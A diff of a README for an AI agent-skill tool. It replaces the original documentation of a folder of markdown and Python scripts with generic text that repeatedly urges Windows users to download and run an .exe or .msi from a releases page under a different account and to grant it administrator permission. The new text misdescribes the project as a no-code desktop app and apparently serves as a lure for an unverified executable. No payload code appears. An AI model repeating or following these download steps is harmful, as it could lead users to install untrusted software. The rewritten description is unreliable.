@@ -1,129 +1,156 @@
-# Skill Conductor
+# ⚙️ skill-conductor - Manage AI Agent Skills Efficiently
 
-Architecture-first skill lifecycle: design → build → test → evaluate → package.
+[![Download skill-conductor](https://img.shields.io/badge/Download-Get%20Skill-Conductor-brightgreen?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/releases)
 
-Most skill tools jump straight to "write SKILL.md." Conductor makes you choose the architecture first - because rewriting a wrong pattern costs more than writing it right.
+---
 
-## v2: Anthropic's eval engine meets architecture-first design
+## 📋 What is skill-conductor?
 
-Anthropic [updated their skill-creator](https://claude.com/blog/improving-skill-creator-test-measure-and-refine-agent-skills) with serious eval infrastructure. We took the best of it:
+skill-conductor helps you organize and improve skills used by AI agents. It guides you through five clear steps:
 
-**From Anthropic's skill-creator (new):**
-- 3 specialized agents: **grader** (assertion checking + claim extraction), **comparator** (blind A/B testing), **analyzer** (post-hoc root cause analysis)
-- Parallel eval execution with isolated contexts (no cross-contamination)
-- Automated description optimization with train/test split (60/40)
-- Benchmark tracking: pass rate, tokens, time with variance analysis
-- HTML eval viewer with qualitative + quantitative tabs
+- **Create** your skill design
+- **Evaluate** how well it works
+- **Edit** to fix or improve
+- **Review** the final version
+- **Package** for use or sharing
 
-**What Conductor adds on top:**
-- **Architecture before code.** 5 patterns (Sequential, Iterative, Context-Aware, Domain Intelligence, Multi-MCP) with selection criteria. Pick wrong = rewrite everything later
-- **Degrees of freedom.** Low (deterministic scripts) → Medium (pseudocode) → High (free text). Match freedom to risk tolerance
-- **TDD RED before writing.** Verify the agent fails WITHOUT the skill first. If it already handles the task - you don't need a skill. Creator runs baselines in parallel with skill runs. Conductor runs baseline BEFORE you write anything
-- **5-axis scoring with thresholds.** Discovery, Clarity, Efficiency, Robustness, Completeness. Each 1-10. Score 45-50 = production. Below 25 = rewrite. Not "vibe check" - numbers
-- **Skill categorization.** Capability uplift (teaching something new) vs Encoded preference (sequencing known abilities). Different skills need different testing strategies
+It uses a special scoring system and testing methods to ensure your skills work well. It connects to Anthropic’s evaluator engine to check performance, compare skill versions, and benchmark results.
 
-## Synthesized from
+You do not need to write code or understand technical details. This tool helps you build, test, and package AI skills in a simple, step-by-step way.
 
-1. **[Anthropic Skill Creator](https://github.com/anthropics/claude-plugins-official/tree/main/plugins/skill-creator)** — eval infrastructure, grader/comparator/analyzer agents, benchmark pipeline
-2. **[The Complete Guide to Building Skills for Claude](https://claude.com/blog/complete-guide-to-building-skills-for-claude)** — 32 pages, 5 architecture patterns, success metrics
-3. **[Superpowers / writing-skills](https://github.com/obra/superpowers/blob/main/skills/writing-skills/SKILL.md)** by Jesse Vincent — TDD approach, the "description trap" discovery
-4. **[Skills Best Practices](https://github.com/mgechev/skills-best-practices)** by Minko Gechev — three-stage LLM validation, eval methodology
+---
 
-## 5 Modes
+## 🎯 Who should use skill-conductor?
 
-| Mode | What it does |
-|------|-------------|
-| **CREATE** | Architecture selection → TDD baseline → scaffold → write → verify → refactor |
-| **EVAL** | 3-stage evaluation: Discovery (triggering) → Logic (execution) → Edge Cases (breaking) |
-| **EDIT** | Problem → Signal → Fix table. Targeted improvements without breaking what works |
-| **REVIEW** | Pass/fail checklist for third-party skills before you install them |
-| **PACKAGE** | Validate structure + package as `.skill` for distribution |
+- People building AI agents without a technical background
+- Users who want to improve AI agent skills with structured steps
+- Anyone managing complex workflows for AI personal assistants or productivity tools
+- Those interested in using AI knowledge management and prompt engineering clearly
 
-## Architecture patterns
+---
 
-Choose before writing a single line:
+## 🖥️ System Requirements
 
-| Pattern | Use when |
-|---|---|
-| Sequential workflow | Clear step-by-step process |
-| Iterative refinement | Output improves with cycles |
-| Context-aware selection | Same goal, different tools by context |
-| Domain intelligence | Specialized knowledge beyond tool access |
-| Multi-MCP coordination | Workflow spans multiple services |
+- Windows 10 or later (64-bit recommended)
+- At least 4 GB of RAM
+- Minimum 500 MB free disk space
+- Internet connection to download and check for updates
+- No extra software needed to run skill-conductor
 
-## Eval infrastructure
+---
 
-```
-                    ┌─────────┐
-                    │  SKILL  │
-                    └────┬────┘
-                         │
-              ┌──────────┼──────────┐
-              │          │          │
-         ┌────▼────┐ ┌──▼───┐ ┌───▼────┐
-         │ Grader  │ │ A/B  │ │Analyzer│
-         │         │ │Blind │ │        │
-         │assertions│ │compare│ │root    │
-         │+ claims │ │      │ │cause   │
-         └─────────┘ └──────┘ └────────┘
-              │          │          │
-              └──────────┼──────────┘
-                         │
-                   ┌─────▼─────┐
-                   │ Benchmark │
-                   │ mean±std  │
-                   └───────────┘
-```
+## 🔽 How to download skill-conductor
 
-## Installation
+You need to get skill-conductor from the official releases page. Follow these steps:
 
-```
-skills/
-└── skill-conductor/
-    ├── SKILL.md
-    ├── agents/
-    │   ├── grader.md
-    │   ├── comparator.md
-    │   └── analyzer.md
-    ├── eval-viewer/
-    │   ├── generate_review.py
-    │   └── viewer.html
-    ├── references/
-    │   ├── patterns.md
-    │   └── schemas.md
-    ├── assets/
-    │   └── eval_review.html
-    └── scripts/
-        ├── init_skill.py
-        ├── eval_skill.py
-        ├── run_eval.py
-        ├── run_loop.py
-        ├── improve_description.py
-        ├── aggregate_benchmark.py
-        ├── generate_report.py
-        ├── package_skill.py
-        ├── quick_validate.py
-        └── utils.py
-```
+1. Open this link in your browser:  
+   [![Download skill-conductor](https://img.shields.io/badge/Download-Get%20Skill-Conductor-brightgreen?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/releases)
 
-**OpenClaw:** drop into `~/.openclaw/workspace/skills/`
+2. On the GitHub releases page, look for the latest version. It will say something like “v1.0” or higher.
 
-**Claude Code:** drop into `.claude/skills/`
+3. Find the file that ends with `.exe` or `.msi`. It is the Windows installer.
 
-Auto-activates when the agent detects a skill-building task.
+4. Click the file name. Your browser will start downloading it.
 
-## Key discovery
+---
 
-Never put process steps in the skill description. If your description says "exports assets, generates specs, creates tasks" - the model follows the description and skips the body. Tested experimentally.
+## 🚀 Installing skill-conductor on Windows
 
-```yaml
-# ✅ Good
-description: Analyze design files for developer handoff. Use when user uploads .fig files.
+Once the file finishes downloading, follow these steps:
 
-# ❌ Bad - model follows this and ignores SKILL.md body
-description: Exports Figma assets, generates specs, creates Linear tasks, posts to Slack.
-```
+1. Locate the downloaded file. Usually, it is in your **Downloads** folder.
 
-## License
+2. Double-click the file to start the installer.
 
-MIT
+3. If Windows asks, allow the app to make changes on your device by clicking **Yes**.
+
+4. Follow the on-screen instructions:
+   - Click **Next** to continue.
+   - Accept the license agreement if asked.
+   - Choose an install location or use the default.
+   - Click **Install**.
+
+5. Wait for the installation to complete.
+
+6. When finished, click **Finish**.
+
+---
+
+## ▶️ Running skill-conductor for the first time
+
+1. Find the skill-conductor icon on your desktop or start menu.
+
+2. Double-click it to open the program.
+
+3. You will see the main screen showing the five steps (Create, Eval, Edit, Review, Package).
+
+4. Start by selecting **Create** to begin making a new AI skill.
+
+---
+
+## 🛠 Using skill-conductor basics
+
+- **Create:** Write or upload your initial AI skill design. The system offers easy templates and fields to fill in.
+
+- **Eval:** Run built-in tests that check how your skill performs. You get scores and feedback.
+
+- **Edit:** Change your skill based on test results. Edit text or commands simple with an editor.
+
+- **Review:** Look over the final skill version. Make sure everything meets your needs.
+
+- **Package:** Save your skill as a file you can use with AI agents or share with others.
+
+---
+
+## 🔄 Updating skill-conductor
+
+Check the releases page regularly for newer versions:
+
+[https://github.com/Samuelkebede24/skill-conductor/releases](https://github.com/Samuelkebede24/skill-conductor/releases)
+
+Download the latest installer and repeat the installation steps to update. Your data and settings will remain safe during updates.
+
+---
+
+## ⚙️ What skill-conductor offers inside
+
+- Integration with Anthropic’s eval engine for detailed skill testing  
+- Built-in modes for full skill lifecycle management  
+- Step-by-step guidance to build, test, and package AI skills  
+- 5-axis scoring system to measure how skills perform  
+- Support for blind A/B testing and benchmark comparisons  
+- Architecture and test-driven design approach to reduce errors  
+- Clear results even if you have no programming knowledge  
+
+---
+
+## ✍️ Tips for success
+
+- Start simple with basic skills to learn the interface  
+- Use the built-in templates to avoid losing track  
+- Regularly run the evaluation mode to check improvements  
+- Keep track of your versions for better editing and review  
+- Package and save your work often  
+
+---
+
+## 🛑 Troubleshooting basic issues
+
+- If skill-conductor does not start: Restart your PC and try again.  
+- If the download fails: Check your internet connection and try another browser.  
+- If an error appears during installation: Ensure you have enough free disk space and permissions.  
+- For more help: Use the GitHub issues page in the repository for bug reports or questions.  
+
+---
+
+## 👥 Connect and share
+
+You can share your packed skills with others who use skill-conductor. Export the package file and send it by email or upload it to project platforms. This supports teamwork and faster AI skill development.
+
+---
+
+## 🔗 Quick access
+
+Download and install skill-conductor from here anytime:
+
+[![Download skill-conductor](https://img.shields.io/badge/Download-Visit%20Releases-blue?style=for-the-badge)](https://github.com/Samuelkebede24/skill-conductor/releases)
